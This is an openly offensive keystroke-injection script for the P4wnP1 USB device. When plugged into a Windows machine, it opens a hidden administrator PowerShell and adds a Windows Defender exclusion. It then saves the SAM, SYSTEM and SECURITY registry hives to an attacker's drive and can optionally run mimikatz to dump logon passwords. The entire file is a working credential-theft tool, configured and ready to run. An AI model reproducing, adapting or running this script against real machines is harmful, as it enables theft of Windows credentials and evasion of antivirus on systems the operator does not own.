/*#########################################################################################################################################\
# cred_dump.js                                                                                                                             #
#   Extraction of Windows credentials (SAM, system and security files) and Users and passwords hashes (with mimikatz).                     #
#   Extract to external SSD or PI internal microSD storage.                                                                                #
#                                                                                                                                          #
#   Author: "cac3r" (from "chriskalv" original "allinOne_extraction.js" script)                                                            #
#                                                                                                                                          #
# PREREQUISTES:                                                                                                                            #
# - Enable keyboard capability and, if you want to extract directly to P4wnP1's microSD, USB mass storage capability in settings.          #
# - Place mimikatz in P4wnP1:\tools in order to be able to extract users & passwords hashes with it.                                       #
# - Edit global settings below.                                                                                                            #
\#########################################################################################################################################*/

/////////// GLOBAL SETTINGS ////////////\
// GENERAL                             // ---
layout("us");                          // Keyboard layout
typingSpeed(0,0);                      // Typing = really fast
run_as_admin=true;                     // Set to true to execute powershell as Administrator
extract_to_ssd=true;                   // Set to true to extract everything to an external SSD instead of mass storage of your P4wnP1 device (might be the better alternative if there are more than just a few)
hide=true;                             // Set to true to hide the console window on the target
exit=true;                             // Set to true to exit the console once finished
modify_defender=true;                  // Disable and enable Windows defender in the process of this script (Powershell must be run as Administrator for this to work [run_as_admin=true])
var usb_drive = "TEMPUSB"              // The name of the P4wnP1's USB storage device, which will be used if "extract_to_ssd" is set to false
var ssd_drive = "USB_OUT";             // The name of your external SSD drive, which will be used if "extract_to_ssd" is set to true
// WINDOWS CREDENTIALS EXTRACTION      // ---
sam=true;                              // Set to true to enable the extraction of Windows credentials dbs (Powershell must be run as Administrator for this to work [run_as_admin=true]). Might be problematic to execute if AntiVir is active on the target system.
mimikatz=false;                        // Use Mimikatz. Must be present on chosen storage
/////////////////////////////////////////

// Definition of other variables, arrays, ...
var delay_time = 1                                                 // The time to wait before executing the attack in seconds
var ready = "False"                                                // Used to make sure that the attack is ready to be executed

// FUNCTIONS
function check_if_ready() {
    while (ready = "False") {
        press("SCROLL");                                           // Press the 'SCROLL LOCK' button
        result = waitLED(SCROLL,10)                                // Wait to see if the 'SCROLL LOCK' has changed for 10ms

        if (result.SCROLL) {                                       // The 'SCROLL LOCK' has changed so we must be connected and ready
            ready = "True";                                        // Stop the while loop
            break;
        }
    }
}
function attack() {
  // Open powershell
    press("GUI r");
    delay(500);
    if (hide) type("powershell -w h -NoP -NonI"); else type("powershell");     // Hide the console if chosen to do so
    if (run_as_admin) {                                                        // Run powershell either as admin or standard user
        press("CTRL SHIFT ENTER");
	    delay(1000);
        press("LEFT");
        delay(200);
        press("ENTER");
        delay(200);
    } else {
        type("\n");
        delay(1000);
    }

  // Identify path/directory names
    if (extract_to_ssd) {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + ssd_drive + "''').Name);");
    } else {
      type("$usbPath =((gwmi win32_volume -f 'label=''" + usb_drive + "''').Name);");
    }
    type("$timestamp = Get-Date -Format '(dd-MM-yyyy_HH-mm)';");
    type("$lootfolder = 'loot_' +$timestamp;");
  
  // Disable Windows Defender
  if (modify_defender && run_as_admin) {
    type("Import-Module Defender;\n");
    type("Set-MpPreference -ExclusionPath $usbPath;\n");
    delay(1000)
  }
    
  // Create directories
    if (sam && run_as_admin) type("$lootPathWincreds = $usbPath+ '' +$lootfolder+ '\\windows_credentials\';mkdir $lootPathWincreds;");
    if (mimikatz && run_as_admin) type("$lootPathUsersPasswords = $usbPath+ '' +$lootfolder+ '\\users_and_passwords\';mkdir $lootPathUsersPasswords;") 
    delay(100);
	
  // Extract Windows credentials
    if (sam && run_as_admin) {
        type("reg.exe save hklm\\sam $lootPathWincreds\\SAM;");                // Save the SAM file
        type("reg.exe save hklm\\system $lootPathWincreds\\System;");          // Save the System file
        type("reg.exe save hklm\\security $lootPathWincreds\\Security;");      // Save Security file
	delay(4000)
    }

  // Get users and passwords (hashes) with mimikatz
    if (mimikatz && run_as_admin) {
        type("cd $usbPath;\n");
        type("cd /tools;\n");
        type('.\\pw.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">> $lootPathUsersPasswords\\$env:UserName`.txt;\n');
        delay(1000)
    }

  // Clean up
    if (modify_defender) {
      type("Remove-MpPreference -ExclusionPath $usbPath;\n");                 // Enable Windows Defender again
    }
  
  // Exit the console if chosen to do so      
    if (exit) { type("exit\n"); }
}

delay(delay_time * 100);
check_if_ready();
attack();
